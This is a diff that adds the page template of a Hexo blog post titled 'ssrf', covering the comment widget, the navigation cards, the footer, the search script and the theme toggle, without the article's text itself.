+    pre[class*="language-"] {
+        color: #e8eaf6;
+    }
+
+    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
+        position: inherit;
+        margin-left: -1.3rem;
+        margin-right: 0.4rem;
+        margin-top: -1px;
+        vertical-align: middle;
+        left: unset;
+        visibility: visible;
+    }
+
+    #vcomments b,
+    strong {
+        font-weight: bold;
+    }
+
+    #vcomments dfn {
+        font-style: italic;
+    }
+
+    #vcomments small {
+        font-size: 85%;
+    }
+
+    #vcomments cite {
+        font-style: normal;
+    }
+
+    #vcomments mark {
+        background-color: #fcf8e3;
+        padding: .2em;
+    }
+
+    #vcomments table, th, td {
+        padding: 12px 13px;
+        border: 1px solid #dfe2e5;
+    }
+
+    table tr:nth-child(2n), thead {
+        background-color: #fafafa;
+    }
+
+    #vcomments table th {
+        background-color: #f2f2f2;
+        min-width: 80px;
+    }
+
+    #vcomments table td {
+        min-width: 80px;
+    }
+
+    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
+        position: inherit;
+        margin-left: -1.3rem;
+        margin-right: 0.4rem;
+        margin-top: -1px;
+        vertical-align: middle;
+        left: unset;
+        visibility: visible;
+    }
+</style>
+
+<div class="card valine-card" data-aos="fade-up">
+    <div class="comment_headling" style="font-size: 20px; font-weight: 700; position: relative; padding-left: 20px; top: 15px; padding-bottom: 5px;">
+        <i class="fas fa-comments fa-fw" aria-hidden="true"></i>
+        <span>评论</span>
+    </div>
+    <div id="vcomments" class="card-content" style="display: grid">
+    </div>
+</div>
+
+<script src="/libs/valine/av-min.js"></script>
+<script src="/libs/valine/Valine.min.js"></script>
+<script>
+    new Valine({
+        el: '#vcomments',
+        appId: '9uxoX9BlIsmwlt8gNkGLF9Ow-gzGzoHsz',
+        appKey: 'rrsgRW80sgJP9PdFwFycskT9',
+        notify: 'false' === 'true',
+        verify: 'false' === 'true',
+        visitor: 'true' === 'true',
+        avatar: 'mm',
+        pageSize: '8',
+        lang: 'zh-cn',
+        placeholder: 'just go go'
+    });
+</script>
+
+<!--酷Q推送-->
+
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
+            <div class="card">
+                <a href="/2022/04/26/ssrf/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/16.jpg" class="responsive-img" alt="ssrf">
+                        
+                        <span class="card-title">ssrf</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-04-26
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            Ethe
+                            
+                        </span>
+                    </div>
+                </div>
+
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/web%E5%AD%A6%E4%B9%A0/">
+                        <span class="chip bg-color">web学习</span>
+                    </a>
+                    
+                    <a href="/tags/ssrf/">
+                        <span class="chip bg-color">ssrf</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2022/04/25/2022MRCTF%E5%A4%8D%E7%8E%B0/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/5.jpg" class="responsive-img" alt="2022MRCTF复现">
+                        
+                        <span class="card-title">2022MRCTF复现</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-04-25
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            Ethe
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/ctf/">
+                        <span class="chip bg-color">ctf</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget card" style="background-color: white;">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+$(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h1, h2, h3, h4'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h1, h2, h3, h4').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
+<style>
+    .aplayer .aplayer-lrc p {
+        
+        display: none;
+        
+        font-size: 12px;
+        font-weight: 700;
+        line-height: 16px !important;
+    }
+
+    .aplayer .aplayer-lrc p.aplayer-lrc-current {
+        
+        display: none;
+        
+        font-size: 15px;
+        color: #42b983;
+    }
+
+    
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
+        left: -66px !important;
+    }
+
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
+        left: 0px !important;
+    }
+
+    
+</style>
+<div class="">
+    
+    <div class="row">
+        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
+                   server="netease"
+                   type="playlist"
+                   id="503838841"
+                   fixed='true'
+                   autoplay='false'
+                   theme='#42b983'
+                   loop='all'
+                   order='random'
+                   preload='auto'
+                   volume='0.7'
+                   list-folded='true'
+        >
+        </meting-js>
+    </div>
+</div>
+
+<script src="/libs/aplayer/APlayer.min.js"></script>
+<script src="/libs/aplayer/Meting.min.js"></script>
+
+    
+
+    <div class="container row center-align"
+         style="margin-bottom: 0px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            
+                <span id="year">2019-2022</span>
+            
+            <a href="/about" target="_blank">Ethe</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            <br>
+            
+                &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
+                        class="white-color">112.8k</span>
+            
+            
+            
+                
+            
+            
+                <span id="busuanzi_container_site_pv">
+                &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;
+                    <span id="busuanzi_value_site_pv" class="white-color"></span>
+            </span>
+            
+            
+                <span id="busuanzi_container_site_uv">
+                &nbsp;|&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;
+                    <span id="busuanzi_value_site_uv" class="white-color"></span>
+            </span>
+            
+            <br>
+
+            <!-- 运行天数提醒. -->
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://github.com/Ethe448" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fab fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:1078240421@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=1078240421" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 1078240421" data-position="top" data-delay="50">
+        <i class="fab fa-qq"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
+        <i class="fas fa-rss"></i>
+    </a>
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script type="text/javascript">
+$(function () {
+    var searchFunc = function (path, search_id, content_id) {
+        'use strict';
+        $.ajax({
+            url: path,
+            dataType: "xml",
+            success: function (xmlResponse) {
+                // get the contents from search data
+                var datas = $("entry", xmlResponse).map(function () {
+                    return {
+                        title: $("title", this).text(),
+                        content: $("content", this).text(),
+                        url: $("url", this).text()
+                    };
+                }).get();
+                var $input = document.getElementById(search_id);
+                var $resultContent = document.getElementById(content_id);
+                $input.addEventListener('input', function () {
+                    var str = '<ul class=\"search-result-list\">';
+                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                    $resultContent.innerHTML = "";
+                    if (this.value.trim().length <= 0) {
+                        return;
+                    }
+                    // perform local searching
+                    datas.forEach(function (data) {
+                        var isMatch = true;
+                        var data_title = data.title.trim().toLowerCase();
+                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                        var data_url = data.url;
+                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
+                        var index_title = -1;
+                        var index_content = -1;
+                        var first_occur = -1;
+                        // only match artiles with not empty titles and contents
+                        if (data_title !== '' && data_content !== '') {
+                            keywords.forEach(function (keyword, i) {
+                                index_title = data_title.indexOf(keyword);
+                                index_content = data_content.indexOf(keyword);
+                                if (index_title < 0 && index_content < 0) {
+                                    isMatch = false;
+                                } else {
+                                    if (index_content < 0) {
+                                        index_content = 0;
+                                    }
+                                    if (i === 0) {
+                                        first_occur = index_content;
+                                    }
+                                }
+                            });
+                        }
+                        // show search results
+                        if (isMatch) {
+                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
+                            var content = data.content.trim().replace(/<[^>]+>/g, "");
+                            if (first_occur >= 0) {
+                                // cut out 100 characters
+                                var start = first_occur - 20;
+                                var end = first_occur + 80;
+                                if (start < 0) {
+                                    start = 0;
+                                }
+                                if (start === 0) {
+                                    end = 100;
+                                }
+                                if (end > content.length) {
+                                    end = content.length;
+                                }
+                                var match_content = content.substr(start, end);
+                                // highlight all keywords
+                                keywords.forEach(function (keyword) {
+                                    var regS = new RegExp(keyword, "gi");
+                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
+                                });
+
+                                str += "<p class=\"search-result\">" + match_content + "...</p>"
+                            }
+                            str += "</li>";
+                        }
+                    });
+                    str += "</ul>";
+                    $resultContent.innerHTML = str;
+                });
+            }
+        });
+    };
+
+    searchFunc('/search.xml', 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+    <!-- 白天和黑夜主题 -->
+<div class="sum-moon-box">
+  <a class="btn-floating btn-large waves-effect waves-light" onclick="switchNightMode()" title="切换主题" >
+    <i id="sum-moon-icon" class="fas fa-sun" style="width:48px; height:48px; font-size: 28px;"></i>
+  </a>
+</div>
+
+<script>
+  function switchNightMode() {
+    $('<div class="Cuteen_DarkSky"><div class="Cuteen_DarkPlanet"></div></div>').appendTo($('body')),
+      setTimeout(function () {
+        $('body').hasClass('DarkMode') 
+        ? ($('body').removeClass('DarkMode'), localStorage.setItem('isDark', '1'), $('#sum-moon-icon').removeClass("fa-sun").addClass('fa-moon')) 
+        : ($('body').addClass('DarkMode'), localStorage.setItem('isDark', '0'), $('#sum-moon-icon').addClass("fa-sun").removeClass('fa-moon')),
+          
+        setTimeout(function () {
+          $('.Cuteen_DarkSky').fadeOut(1e3, function () {
+            $(this).remove()
+          })
+        }, 2e3)
+      })
+  }
+</script>
+
+    <script>
+    //模式判断 
+    if (localStorage.getItem('isDark') === '0') {
+        document.body.classList.add('DarkMode');
+        $('#sum-moon-icon').addClass("fa-sun").removeClass('fa-moon')
+    } else {
+        document.body.classList.remove('DarkMode');
+        $('#sum-moon-icon').removeleClass("fa-sun").addClass('fa-moon')
+    }
+    </script>
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    
+
+    
+
+    <!-- 雪花特效 -->
+    
+
+    <!-- 鼠标星星特效 -->
+    
+
+     
+        <script src="https://ssl.captcha.qq.com/TCaptcha.js"></script>
+        <script src="/libs/others/TencentCaptcha.js"></script>
+        <button id="TencentCaptcha" data-appid="xxxxxxxxxx" data-cbfn="callback" type="button" hidden></button>
+    
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+    
+    
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+    <!--腾讯兔小巢-->
+    
+    
+
+    
+
+    
+
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+</body>
+
+</html>
